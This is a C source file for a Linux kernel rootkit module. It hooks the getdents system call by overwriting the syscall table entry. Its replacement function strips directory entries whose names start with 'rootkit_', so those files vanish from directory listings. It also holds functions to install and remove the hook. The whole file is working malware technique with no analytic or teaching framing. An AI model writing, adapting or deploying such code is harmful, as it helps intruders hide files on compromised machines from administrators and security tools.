#include <linux/moduleparam.h>
#include <linux/sched.h>
#include <asm/page.h>
#include <asm/pgtable.h>
#include <asm/unistd.h>
#include <asm/processor-flags.h>
#include <linux/types.h>
#include "sysmap.h"
#include "file_hiding.h"

static char * prefix = "rootkit_";
static int prefixLen = 8;
/* Structure directory entries */
struct linux_dirent {
  unsigned long  d_ino;     /* Inode number */
  unsigned long  d_off;     /* Offset to next linux_dirent */
  unsigned short d_reclen;  /* Length of this linux_dirent */
  char           d_name[];  /* Filename (null-terminated) */
};

void ** syscall_table = (void * *) sys_call_table_R;
long (*orig_sys_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
int r_count=0;

/* Check if the given name begins with the predefined prefix"*/
int find_hide_file(char *name){
  int index = 0;
  while(index<prefixLen){
    if(name[index] == '\0' || name[index] != prefix[index]){
      return 0;
    } 
    index++;
  }
  return 1;
}

static long my_sys_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
  r_count++;
  long retVal;
  retVal = orig_sys_getdents(fd, dirent, count);
  if(fd==3){
    unsigned long restLen;
    unsigned short currLen;

    printk(KERN_INFO "get dents value %ld\n",retVal);
    if(retVal > 0){
      restLen = retVal;
      while(restLen>0){
        currLen = dirent->d_reclen;
        // avoid loop to death
        if(currLen<=0){
          break;
        }
        restLen -= currLen;
        if(find_hide_file(dirent->d_name)){
          memmove(dirent, (char *) dirent + dirent->d_reclen, restLen);
          retVal -= currLen;
        } else if(restLen){
          /* Jump to next entry */
          dirent = (struct linux_dirent *) ((char *)dirent + dirent->d_reclen);
        }
      }
    }
  }
  r_count--;
  return retVal;
}


void hide_file (void)
{
  orig_sys_getdents = syscall_table[__NR_getdents];
  syscall_table[__NR_getdents] = my_sys_getdents;
}

void unhide_file(void)
{
  syscall_table[__NR_getdents] = orig_sys_getdents;
  while(r_count > 0){ //hack to unblock read
    printk(KERN_INFO "\n");
  }  
}
